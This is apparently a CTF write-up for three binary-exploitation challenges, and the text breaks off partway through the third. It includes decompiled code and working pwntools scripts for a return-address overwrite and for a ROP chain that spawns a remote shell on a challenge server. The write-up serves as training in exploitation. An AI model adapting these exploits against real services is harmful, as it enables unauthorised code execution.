
1. deja vu
2. jail!
3. squ1rrel-casino

--- 
# deja vu

```bash
[*] '/mnt/d/squ1rrel/deja vu/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO, No canary, No PIE

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-40h] BYREF

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  printf("pwnme: ");
  gets(v4);
  return 0;
}
```

So easy prob. It has `bof` vuln. Even,

```C
int win()
{
  char s[8]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v2; // [rsp+8h] [rbp-68h]
  __int64 v3; // [rsp+10h] [rbp-60h]
  __int64 v4; // [rsp+18h] [rbp-58h]
  __int64 v5; // [rsp+20h] [rbp-50h]
  __int64 v6; // [rsp+28h] [rbp-48h]
  __int64 v7; // [rsp+30h] [rbp-40h]
  __int64 v8; // [rsp+38h] [rbp-38h]
  __int64 v9; // [rsp+40h] [rbp-30h]
  __int64 v10; // [rsp+48h] [rbp-28h]
  __int64 v11; // [rsp+50h] [rbp-20h]
  __int64 v12; // [rsp+58h] [rbp-18h]
  int v13; // [rsp+60h] [rbp-10h]
  FILE *stream; // [rsp+68h] [rbp-8h]

  *(_QWORD *)s = 0LL;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0;
  puts("You got it!!");
  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Error: Could not open flag.txt (create this file for testing)");
  fgets(s, 100, stream);
  printf("%s", s);
  return fclose(stream);
}
```

It has `win` function. Do `Return Address Overwrite`(`RAO?`).

# exploit

```python
from pwn import *

p = remote('20.84.72.194', 5000)
e = ELF('./prob')

p.sendlineafter(b': ', b'a' * 0x48 + p64(e.sym['win']))
p.interactive()
```

---

# jail!

```bash
[*] '/mnt/d/squ1rrel/jail!/prison'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO, NO PIE

```
prison: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=11861526f4bb256264011fa2e0118c82e3b99e2c, for GNU/Linux 3.2.0, not stripped
```

`statically linked`. So, It has many gadgets like `pop rax, rdi, rsi, rdx` or `syscall` etc..

```C
__int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  __int64 result; // rax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // esi
  int v15; // edx
  int v16; // ecx
  int v17; // r8d
  int v18; // r9d
  _QWORD v19[7]; // [rsp+0h] [rbp-80h]
  int v20; // [rsp+3Ch] [rbp-44h] BYREF
  _BYTE v21[64]; // [rsp+40h] [rbp-40h] BYREF

  v19[1] = "Empty Cell";
  v19[2] = "Jay. L. Thyme";
  v19[3] = "Jay. L. Thyme's Wife";
  v19[4] = "Jay. L. Thyme's Wife's Boyfriend";
  v19[5] = "Rob Banks";
  printf(
    (unsigned int)"They gave you the premium stay so at least you get to choose your cell (1-6): ",
    a2,
    a3,
    a4,
    a5,
    a6);
  if ( (unsigned int)_isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v6, v7, v8, v9, (char)"The Professor") == 1 )
  {
    while ( (unsigned int)getchar() != 10 )
      ;
    v14 = v20;
    printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, v19[v20 - 1], v11, v12, v13);
    printf((unsigned int)"Now let's get the registry updated. What is your name: ", v14, v15, v16, v17, v18);
    fgets(v21, 100LL, stdin);
    puts("...");
    sleep(3LL);
    puts("...");
    return puts("What did you expect. You're in here for life this is what it looks like for the rest.");
  }
  else
  {
    puts("Invalid input!");
    do
      result = getchar();
    while ( (_DWORD)result != 10 );
  }
  return result;
}
```

Since it doesn't check `v20`, it has `oob` vuln, but anyway I didn't use this vuln.
It also has `bof` vuln. I can use various gadget, so I exploit it with `stack pivoting` and `syscall`.

# exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./prison')
p = remote('20.84.72.194', 5001)
e = ELF('./prison')

bss = 0x4d2500
syscall = 0x00000000004013b8
pop_rax = 0x000000000041f464
pop_rdi = 0x0000000000401a0d
xor_edi_rdi = 0x000000000047ddda
pop_rsi_rbp = 0x0000000000413676
pop_rdx = 0x0000000000401a1a
leave = 0x0000000000401b54

p.sendlineafter(b': ', b'1')
payload = b'a' * 64 + p64(bss + 0x40) + p64(0x401b05)
p.sendlineafter(b'name: ', payload)

sleep(4)
payload = p64(xor_edi_rdi) + p64(pop_rsi_rbp) + p64(bss + 0x100) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x100) + p64(e.sym['read']) + p64(leave)
payload += p64(bss - 8) + p64(leave)
#gdb.attach(p)
p.sendline(payload)

sleep(4)
payload = b'/bin/sh\x00' + p64(pop_rdi) + p64(bss + 0x100) + p64(pop_rsi_rbp) + p64(0) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
p.send(payload)
p.interactive()
```

---
# squ1rrel-casino

```bash
[*] '/mnt/d/squ1rrel/squ1rrel-casino/casino'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO

```C
size_t initialize_game()
{
  size_t result; // rax

  player = 100;
  dword_40A4 = 0;
  printf("Enter your name: ");
  result = (size_t)fgets(byte_40A8, 64, stdin);
  if ( result )
  {
    result = strcspn(byte_40A8, "\n");
    byte_40A8[result] = 0;
  }
  return result;
}
```

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [rsp+Ch] [rbp-34h] BYREF
  time_t timer; // [rsp+10h] [rbp-30h] BYREF
  struct tm *v7; // [rsp+18h] [rbp-28h]
  timeval tv; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  v3 = time(0LL);
  srand(v3);
  initialize_game();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("\n=== Squ1rrel Casino Menu ===");
      puts("1. Play Blackjack");
      puts("2. Show Balance");
      puts("3. Exit");
      printf("Choose an option: ");
      if ( (unsigned int)__isoc99_scanf("%d", &v5) == 1 )
        break;
      puts("Invalid input!");
      while ( getchar() != 10 )
        ;
    }
    while ( getchar() != 10 )
      ;
    if ( v5 == 3 )
      break;
    if ( v5 > 3 )
      goto LABEL_15;
    if ( v5 == 1 )
    {
      play_blackjack();
    }
    else if ( v5 == 2 )
    {
      show_balance();
    }
    else
    {
LABEL_15:
      puts("Invalid option!");
    }
  }
  puts("Thanks for playing at the Squ1rrel Casino!");
  gettimeofday(&tv, 0LL);
  timer = tv.tv_sec;
  v7 = localtime(&timer);
  printf("But it's only %02d:%02d! Surely you can stay longer?\n", v7->tm_hour, v7->tm_min);
  return 0;
}
```

In, `initialize_game`, receive `name` input. After it, `main` functions as a initial menu. You can sense easily `show_balance` doesn't have any vuln. Let's check `play_blackjack`.

```C
unsigned __int64 play_blackjack()
{
  __int64 *card_name; // rax
  __int64 *v1; // rax
  __int64 *v2; // rax
  __int64 *v3; // r12
  __int64 *v4; // rax
  int card_value; // ebx
  int v6; // ebx
  char v8; // [rsp+5h] [rbp-3Bh]
  unsigned __int8 v9; // [rsp+6h] [rbp-3Ah]
  unsigned __int8 v10; // [rsp+7h] [rbp-39h]
  unsigned __int8 v11; // [rsp+8h] [rbp-38h]
  unsigned __int8 v12; // [rsp+9h] [rbp-37h]
  char v13; // [rsp+Ah] [rbp-36h]
  unsigned __int8 v14; // [rsp+Bh] [rbp-35h]
  int v15; // [rsp+Ch] [rbp-34h] BYREF
  int v16; // [rsp+10h] [rbp-30h]
  int v17; // [rsp+14h] [rbp-2Ch]
  unsigned __int64 v18; // [rsp+18h] [rbp-28h]

  v18 = __readfsqword(0x28u);
  v9 = draw_card();
  v10 = draw_card();
  v11 = draw_card();
  v12 = draw_card();
  byte_40E8 = (16 * v10) | v9;
  printf("\nWelcome to Blackjack, %s!\n", byte_40A8);
  printf("Your balance: $%d\n", player);
  puts("\nYour cards:");
  card_name = get_card_name(v9);
  printf("Card 1: %s (0x%X)\n", (const char *)card_name, v9);
  v1 = get_card_name(v10);
  printf("Card 2: %s (0x%X)\n", (const char *)v1, v10);
  v2 = get_card_name(v11);
  printf("Dealer's face-up card: %s (0x%X)\n", (const char *)v2, v11);
  v8 = 1;
  do
  {
    puts("\nOptions:");
    puts("1. View a card");
    if ( v8 )
      puts("2. Replace a card (once per game)");
    puts("3. Stand (end your turn)");
    puts("4. Exit game");
    printf("Choose an option: ");
    if ( (unsigned int)__isoc99_scanf("%d", &v15) == 1 )
    {
      if ( v15 == 4 )
        return v18 - __readfsqword(0x28u);
      if ( v15 > 4 )
      {
LABEL_35:
        puts("Invalid option!");
        continue;
      }
      switch ( v15 )
      {
        case 3:
          v3 = get_card_name(v12);
          v4 = get_card_name(v11);
          printf("\nDealer's cards: %s (0x%X) and %s (0x%X)\n", (const char *)v4, v11, (const char *)v3, v12);
          v13 = byte_40E8 & 0xF;
          v14 = (unsigned __int8)byte_40E8 >> 4;
          card_value = get_card_value(byte_40E8 & 0xF);
          v16 = card_value + get_card_value(v14);
          v6 = get_card_value(v11);
          v17 = v6 + get_card_value(v12);
          if ( v16 > 21 && (v13 == 1 || v14 == 1) )
            v16 -= 10;
          if ( v17 > 21 && (v11 == 1 || v12 == 1) )
            v17 -= 10;
          printf("Your total: %d\n", v16);
          printf("Dealer's total: %d\n", v17);
          if ( v16 <= 21 )
          {
            if ( v17 <= 21 )
            {
              if ( v16 <= v17 )
              {
                if ( v17 <= v16 )
                {
                  puts("It's a tie!");
                }
                else
                {
                  puts("Dealer wins.");
                  player -= 10;
                }
              }
              else
              {
                puts("You win!");
                player += 20;
                ++dword_40A4;
              }
            }
            else
            {
              puts("Dealer busts! You win!");
              player += 20;
              ++dword_40A4;
            }
          }
          else
          {
            puts("You bust! Dealer wins.");
            player -= 10;
          }
          break;
        case 1:
          view_card();
          break;
        case 2:
          if ( v8 )
          {
            replace_card();
            v8 = 0;
          }
          else
          {
            puts("You've already replaced a card this game!");
          }
          break;
        default:
          goto LABEL_35;
      }
    }
    else
    {
      puts("Invalid input!");
      while ( getchar() != 10 )
        ;
    }
  }
  while ( v15 != 3 && v15 != 4 );
  return v18 - __readfsqword(0x28u);
}
```

`play_blackjack` play game menu role. What we need to check first is, We don't have to care win or lose. Because there isn't price about our money, and we can just leave game, not to drop money. Another thing we can know from this is, we don't have to predict `rand` although we can do it. Honestly, it's annoying, isn't it? Thank goodness.

```C
__int64 *__fastcall get_card_name(char a1)
{
  switch ( a1 )
  {
    case 1:
      name_0 = ')1( ecA';
      break;
    case 2:
      name_0 = ')2( owT';
      break;
    case 3:
      strcpy((char *)&name_0, "Three (3)");
      break;
    case 4:
      strcpy((char *)&name_0, "Four (4)");
      break;
    case 5:
      strcpy((char *)&name_0, "Five (5)");
      break;
    case 6:
      name_0 = ')6( xiS';
      break;
    case 7:
      strcpy((char *)&name_0, "Seven (7)");
      break;
    case 8:
      strcpy((char *)&name_0, "Eight (8)");
      break;
    case 9:
      strcpy((char *)&name_0, "Nine (9)");
      break;
    case 10:
      strcpy((char *)&name_0, "Ten (10)");
      break;
    case 11:
      strcpy((char *)&name_0, "Jack (10)");
      break;
    case 12:
      strcpy((char *)&name_0, "Queen (10)");
      break;
    case 13:
      strcpy((char *)&name_0, "King (10)");
      break;
    case 14:
      strcpy((char *)&name_0, "Joker (10)");
      break;
    case 15:
      strcpy((char *)&name_0, "Special (10)");
      break;
    default:
      name_0 = 'nwonknU';
      break;
  }
  return &name_0;
}
```

```C
unsigned __int64 view_card()
{
  __int64 *card_name; // rax
  unsigned __int8 card; // [rsp+Bh] [rbp-25h]
  int v3; // [rsp+Ch] [rbp-24h] BYREF
  char *v4; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  printf("Which card to view? ");
  if ( (unsigned int)__isoc99_scanf("%d", &v3) == 1 )
  {
    if ( --v3 > 2 )
    {
      puts("Not your card!");
    }
    else
    {
      v4 = &byte_40E8;
      card = get_card((__int64)&byte_40E8, v3);
      card_name = get_card_name(card);
      printf("Card #%d: %s (0x%X)\n", v3 + 1, (const char *)card_name, card);
    }
  }
  else
  {
    puts("Invalid input!");
    while ( getchar() != 10 )
      ;
  }
  return v5 - __readfsqword(0x28u);
}
```

In `view_card`, it doesn't check negative index of `v3`, so `oob` occurs. Also, since it prints info, we can leak pie, libc address. libc : read `puts`'s got, pie : read ``